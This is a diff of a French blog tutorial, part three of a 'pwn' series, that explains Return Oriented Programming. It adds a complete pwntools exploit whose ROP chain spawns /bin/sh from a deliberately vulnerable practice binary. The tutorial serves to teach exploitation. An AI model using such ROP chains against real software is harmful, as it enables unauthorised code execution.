@@ -2,11 +2,14 @@
 author: "Laluka"
 title: "PWN 3/4 : SaperliROPette !"
 date: 2018-05-09
+description: "Introcution au Return Oriented Programming (ROP) et exemple pratique."
 ---
 
 Route du pwn, troisième et avant dernière escale, bienvenue à bord !
 
 Hier, le simple buffer overflow et le ret2libc, aujourd'hui, le ROP, ou Return Oriented Programming, et demain... Demain la conquête du monde !!!
+
+<img class="img_med" src="/hacking/pwn_3of4_saperliropette/aboard.jpg" alt="aboard" >
 
 Je vous ai laissé hier sur le ret2libc, qui, vu de loin, consiste à piocher dans la libc les fonctions qui nous intéressent. Sauf que cette attaque n'est pas possible dans le cas où le programme est compilé en statique, et difficilement faisable si l'ASLR est activé. Nous allons aujourd'hui découvrir le ROP qui nous permet de contourner ces protections.
 
@@ -38,6 +41,8 @@ Même si on "peut tout faire", la stratégie la plus commune reste de faire comm
 
 Une chose importante à relever ici : On a besoin de gadgets. Les gadgets, c'est du code qui ne bouge pas. Les librairies, ca bouge. Donc un programme qui se base sur les librairies aura bien moins de surface d'attaque qu'un programme compilé en statique, qui, lui, contient tout le code qu'il utilise. De même, plus un programme va être volumineux et faire des actions complexes, plus vous avez de chance qu'il y ait des gadgets intéressants. Capich ? Noice !
 
+<img class="img_med" src="/hacking/pwn_3of4_saperliropette/noice.gif" alt="noice" >
+
 Maintenant, abordons plus en détail les gadgets voulez-vous ?
 
 Ils doivent tous répondre à un critère majeur : Se terminer par une instruction ret.
@@ -49,25 +54,79 @@ Méfiance tout de même, si votre gadget se termine par un ret, mais contient de
 De nombreux outils permettent de lister les gadgets d'un exécutable, comme ROPgadget, Ropper, XRop, ...
 
 3. Elaboration de l'exploit :
+
+Le binaire étudié est téléchargable [ici](/hacking/pwn_3of4_saperliropette/vuln) !
+
 Avant toute chose, on regarde un peu à quoi on s'attaque : x64, compilé en statique, full ASLR. Ok !
+
+<img class="img_full" src="/hacking/pwn_3of4_saperliropette/readelf.png" alt="readelf" >
 
 Vous avez l'habitude maintenant, le classique :
 
 Comprendre le fonctionnement du programme, trouver le point de crash, puis l'offset !
 
+<img class="img_full" src="/hacking/pwn_3of4_saperliropette/pattern_create.png" alt="pattern_create" >
+
+<img class="img_full" src="/hacking/pwn_3of4_saperliropette/crash.png" alt="crash" >
+
 Ici encore, on voit que l'on crash sur un ret... Contrôlons-nous RSP ? Oui ! Offset ? 264 !
 
+<img class="img_full" src="/hacking/pwn_3of4_saperliropette/pattern_search.png" alt="pattern_search" >
+
 Petit rappel, ret a pour effet de placer ce vers quoi pointe RSP (donc le dernier élément de la stack), dans RIP. Nous avons donc RIP sous notre contrôle. Donc... RIP !
+
+<img class="img_med" src="/hacking/pwn_3of4_saperliropette/dead_shell.jpg" alt="dead_shell" >
 
 On utilise ensuite l'outil ropgadget qui nous offre une superbe ropchain faite à partir de notre programme vulnérable : $ ropgadget --binary vuln --ropchain
 
 L'output est long (verbeux), je n'en mets qu'une partie :
 
+<img class="img_full" src="/hacking/pwn_3of4_saperliropette/ropgadget.png" alt="ropgadget" >
+
 On en fait donc un fichier python, notre exploit est donc :
+
+
+```python
+#!/usr/bin/env python2
+
+from pwn import *
+
+# Setting up
+context.log_level = "debug"
+
+offset = 264
+payload = "A" * offset
+payload += p64(0x00000000004016a7)  # pop rsi ; ret
+payload += p64(0x00000000006b41c0)  # @ .data
+payload += p64(0x000000000043167d)  # pop rax ; ret
+payload += '/bin//sh'
+payload += p64(0x000000000045f661)  # mov qword ptr [rsi], rax ; ret
+payload += p64(0x00000000004016a7)  # pop rsi ; ret
+payload += p64(0x00000000006b41c8)  # @ .data + 8
+payload += p64(0x000000000041918f)  # xor rax, rax ; ret
+payload += p64(0x000000000045f661)  # mov qword ptr [rsi], rax ; ret
+payload += p64(0x000000000040158b)  # pop rdi ; ret
+payload += p64(0x00000000006b41c0)  # @ .data
+payload += p64(0x00000000004016a7)  # pop rsi ; ret
+payload += p64(0x00000000006b41c8)  # @ .data + 8
+payload += p64(0x0000000000432ef5)  # pop rdx ; ret
+payload += p64(0x00000000006b41c8)  # @ .data + 8
+payload += p64(0x000000000041918f)  # xor rax, rax ; ret
+payload += p64(0x0000000000453b50) * 59 # add rax, 1 ; ret
+payload += p64(0x00000000004546e5)  # syscall ; ret
+
+p = process("./vuln")
+p.recv()
+p.sendline(payload)
+p.interactive()
+p.close()
+```
 
 C'est pas beau toute cette automatisation ? Bon, ca ne marche pas à tous les coups, mais quand ca marche, le gain de temps est énorme, surtout en CTF... ;)
 
 On va maintenant l'exploiter :
+
+<img class="img_full" src="/hacking/pwn_3of4_saperliropette/run_exploit.png" alt="run_exploit" >
 
 TADA, one more shell ! :D
 
@@ -85,8 +144,8 @@ Vous avez désormais quelques cartes en main : BOF / shellcode / ret2libc / ROP 
 
 C'est pourquoi notre prochaine rencontre se fera autour de l'analyse d'un programme un peu plus complet. Nous allons donc conclure cette série et...
 
-Tout faire péterrrrr !
+Tout faire péterrrrr ! `\o/`
+
+<img class="img_med" src="/hacking/pwn_3of4_saperliropette/like_a_boss.gif" alt="like_a_boss" >
 
 A très vite,
-
--Laluka
